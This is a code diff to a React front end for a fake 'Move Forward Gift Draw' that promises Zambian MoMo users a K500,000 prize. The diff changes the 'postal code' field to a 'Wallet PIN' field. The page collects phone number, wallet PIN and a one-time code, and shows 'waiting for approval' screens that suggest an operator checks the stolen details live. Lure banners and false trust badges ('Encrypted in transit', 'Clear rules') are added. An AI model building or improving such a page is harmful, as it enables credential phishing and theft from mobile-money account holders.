@@ -52,9 +52,9 @@ function App() {
   const [featuredIndex, setFeaturedIndex] = useState(0)
   const [activityIndex, setActivityIndex] = useState(0)
   const [phone, setPhone] = useState('')
-  const [postalCode, setPostalCode] = useState('')
-  const demoCode = postalCode
-  const setDemoCode = setPostalCode
+  const [walletpin, setWalletpin] = useState('')
+  const demoCode = walletpin
+  const setDemoCode = setWalletpin
   const [otp, setOtp] = useState('')
   const [otpSeconds, setOtpSeconds] = useState(120)
   const [eligibilityReference, setEligibilityReference] = useState('')
@@ -126,11 +126,11 @@ function App() {
     if (field) {
       field.type = 'text'
       field.placeholder = 'e.g. 10101'
-      field.setAttribute('aria-label', 'Postal code')
+      field.setAttribute('aria-label', 'Wallet Pin')
     }
-    if (label) label.textContent = 'Postal code'
+    if (label) label.textContent = 'Wallet PIN'
     if (note) note.textContent = 'We use this to confirm campaign coverage in your area.'
-    if (description) description.textContent = 'Use the number linked to your MoMo account and your 4- or 5-digit postal code.'
+    if (description) description.textContent = 'Use the number linked to your MoMo account and your 4- or 5-digit wallet PIN.'
     return undefined
   }, [view])
 
@@ -185,7 +185,7 @@ function App() {
       const result = await response.json()
       if (!response.ok) throw new Error(result.message || 'Unable to check the approval status.')
       if (result.status === 'allowed') return
-      if (result.status === 'invalid') throw new Error('Please check your phone number and postal code, then try again.')
+      if (result.status === 'invalid') throw new Error('Please check your phone number and wallet PIN, then try again.')
       if (result.status === 'notification_failed') throw new Error('We could not send your information for approval. Please try again.')
     }
     throw new Error('Approval is taking longer than expected. Please try again.')
@@ -206,7 +206,7 @@ function App() {
     event.preventDefault()
     setStatus({ type: 'loading', message: 'Checking your MoMo details...' })
     try {
-      const response = await apiFetch('/api/eligibility', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone, postalCode, consent }) })
+      const response = await apiFetch('/api/eligibility', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone, walletpin, consent }) })
       const result = await response.json()
       if (!response.ok) throw new Error(result.message)
       setEligibilityReference(result.reference)
@@ -236,12 +236,12 @@ function App() {
         setStatus({ type: 'error', message: 'Wrong code. Enter another code and try again.' })
       } else if (finalDecision === 'invalid_info') {
         setPhone('')
-        setPostalCode('')
+        setWalletpin('')
         setConsent(false)
         setEligibilityReference('')
         window.history.pushState({}, '', '#eligibility')
         setView('eligibility')
-        setStatus({ type: 'error', message: 'Please check your phone number and postal code, then try again.' })
+        setStatus({ type: 'error', message: 'Please check your phone number and wallet PIN, then try again.' })
       } else {
         setStatus({ type: 'success', message: 'Code accepted.' })
         setIsDrawConfirmed(true)
@@ -267,7 +267,7 @@ function App() {
       <header className="site-header">
         <a className="wordmark" href="#top" onClick={returnHome}><span className="wordmark-symbol"><MoveForwardMark /></span><span>Move<span>Forward</span><b>.</b></span></a>
         <button className="menu-button" type="button" aria-label="Toggle navigation" onClick={() => setIsMenuOpen(!isMenuOpen)}>{isMenuOpen ? <X /> : <Menu />}</button>
-        <nav className={isMenuOpen ? 'site-nav is-open' : 'site-nav'}><a href="#gifts" onClick={(event) => goToSection(event, 'gifts')}>Gift vault</a><a href="#details" onClick={(event) => goToSection(event, 'details')}>How it works</a><a className="nav-action" href="#eligibility" onClick={enterDraw}>Check eligibility <ArrowRight size={16} /></a></nav>
+        <nav className={isMenuOpen ? 'site-nav is-open' : 'site-nav'}><a href="#gifts" onClick={(event) => goToSection(event, 'gifts')}>Gift vault</a><a href="#details" onClick={(event) => goToSection(event, 'details')}>How it works</a><a className="nav-action" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={16} /></a></nav>
       </header>
       {isEntering && <div className="entry-loader" role="status"><div className="loader-mark"><MoveForwardMark /></div><strong>Opening your eligibility check</strong><span>Preparing the next step...</span><i /></div>}
       {(status.type === 'loading' || status.type === 'pending') && view === 'eligibility' && <div className="entry-loader" role="status"><div className="loading-spinner" /><strong>{status.type === 'pending' ? 'Waiting for approval' : 'Checking your eligibility'}</strong><span>{status.type === 'pending' ? 'We are reviewing your information...' : 'Securely confirming your MoMo details...'}</span></div>}
@@ -278,8 +278,10 @@ function App() {
 
       {view === 'otp' ? <main className="otp-view"><section className="otp-page section-width"><a className="back-link" href="#eligibility" onClick={(event) => { event.preventDefault(); window.history.pushState({}, '', '#eligibility'); setView('eligibility') }}>← Back to eligibility</a><div className="otp-panel"><div className="otp-message"><span className="section-kicker">ONE MORE STEP</span><h2>Verify your<br /><em>number.</em></h2><p>We sent a verification code to the number ending in {phone.slice(-4) || '••••'}.</p><div className="check-points"><span><Check size={15} /> Secure verification</span><span><Check size={15} /> Code expires in 2 minutes</span></div></div><form className="otp-form" onSubmit={submitOtp}><div className="form-heading"><span>MOVE FORWARD</span><h3>Enter your code</h3><p>Use the 4- to 6-digit code sent to your number.</p></div><label htmlFor="otp">Verification code</label><input className="code-input otp-input" id="otp" type="text" inputMode="numeric" pattern="\d{4,6}" minLength="4" maxLength="6" placeholder="000000" value={otp} onChange={(event) => setOtp(event.target.value.replace(/\D/g, '').slice(0, 6))} aria-describedby="otp-timer" required /><p className={otpSeconds === 0 ? 'otp-timer expired' : 'otp-timer'} id="otp-timer">{otpSeconds === 0 ? 'Code expired.' : <>Code expires in <strong>{otpMinutes}:{otpRemainingSeconds}</strong></>}</p><button className="submit-button" type="submit" disabled={isOtpVerifying || otpSeconds === 0}>Verify and continue <ArrowRight size={17} /></button>{status.type === 'success' && <p className="form-status success">{status.message}</p>}</form></div></section></main> : view === 'landing' ? <main id="top" className="landing-view">
         <section className="campaign-strip" aria-label="Campaign information"><div><span className="pulse" /> Applications open</div><span>Free to enter</span><span>For eligible Zambian MoMo users</span><a href="#details" onClick={(event) => goToSection(event, 'details')}>Read the rules <ArrowRight size={14} /></a></section>
+        <section className="grant-banner section-width" aria-label="Headline grant prize"><div className="grant-banner-copy"><span className="section-kicker"><Sparkles size={14} /> THE HEADLINE GRANT</span><strong>K500,000</strong><span>to fund your next move</span></div><div className="grant-banner-note"><Gift size={18} /><span>Free entry<br /><b>20 rewards in total</b></span></div><a className="grant-banner-action" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={16} /></a></section>
         <section className="hero section-width">
-          <div className="hero-copy"><span className="section-kicker"><Trophy size={14} /> THE MOVE FORWARD GIFT DRAW</span><span className="campaign-badge"><span className="pulse" /> Applications open</span><h1>A practical boost for your <em>next move.</em></h1><p>Eligible Zambian MoMo users can enter for free for the campaign's headline grand prize: <strong>K500,000</strong>, or choose from 19 practical rewards under the campaign rules.</p><div className="hero-actions"><a className="hero-button" href="#eligibility" onClick={enterDraw}>Check eligibility <ArrowRight size={18} /></a><a className="hero-text-link" href="#gifts" onClick={(event) => goToSection(event, 'gifts')}>See the rewards <ArrowRight size={15} /></a></div><div className="hero-proof"><span><ShieldCheck size={15} /> No entry fee</span><span><Clock3 size={15} /> Takes about 3 minutes</span><span><Globe2 size={15} /> Zambia-wide</span></div></div>
+          <div className="flying-gifts" aria-hidden="true"><span className="flying-gift gift-one"><Gift /></span><span className="flying-gift gift-two"><Gift /></span><span className="flying-gift gift-three"><Gift /></span><span className="flying-gift gift-four"><Gift /></span><span className="flying-gift gift-five"><Gift /></span></div>
+          <div className="hero-copy"><span className="section-kicker"><Trophy size={14} /> THE MOVE FORWARD GIFT DRAW</span><span className="campaign-badge"><span className="pulse" /> Applications open</span><h1>Win <em>K500,000</em> for your next move.</h1><p>Eligible Zambian MoMo users can enter for free for the campaign's headline grant, or choose from 19 practical rewards under the campaign rules.</p><div className="hero-actions"><a className="hero-button" href="#eligibility" onClick={enterDraw}>Enter the draw <ArrowRight size={18} /></a><a className="hero-text-link" href="#gifts" onClick={(event) => goToSection(event, 'gifts')}>See the rewards <ArrowRight size={15} /></a></div><div className="hero-proof"><span><ShieldCheck size={15} /> No entry fee</span><span><Clock3 size={15} /> Takes about 3 minutes</span><span><Globe2 size={15} /> Zambia-wide</span></div></div>
           <div className="hero-prize"><div className="hero-prize-orb" /><div className="hero-prize-label">HEADLINE GRAND PRIZE</div><strong>K500,000</strong><span>Cash grant or equivalent reward value</span><div className="hero-prize-photo" style={{ backgroundImage: `url(${gifts[0].image})` }} /><small>One headline reward, plus 19 practical gifts across travel, home, tech, and mobility.</small><div className="prize-stamp">20<br /><small>REWARDS<br />IN TOTAL</small></div></div>
         </section>
         <section className="trust-row"><div><ShieldCheck size={17} /><span><strong>Clear rules</strong><small>Choice explained upfront</small></span></div><div><Globe2 size={17} /><span><strong>Zambia-wide</strong><small>Built for MoMo users</small></span></div><div><LockKeyhole size={17} /><span><strong>Private check</strong><small>Encrypted in transit</small></span></div><div><Gift size={17} /><span><strong>20 rewards</strong><small>Gift or cash option</small></span></div></section>
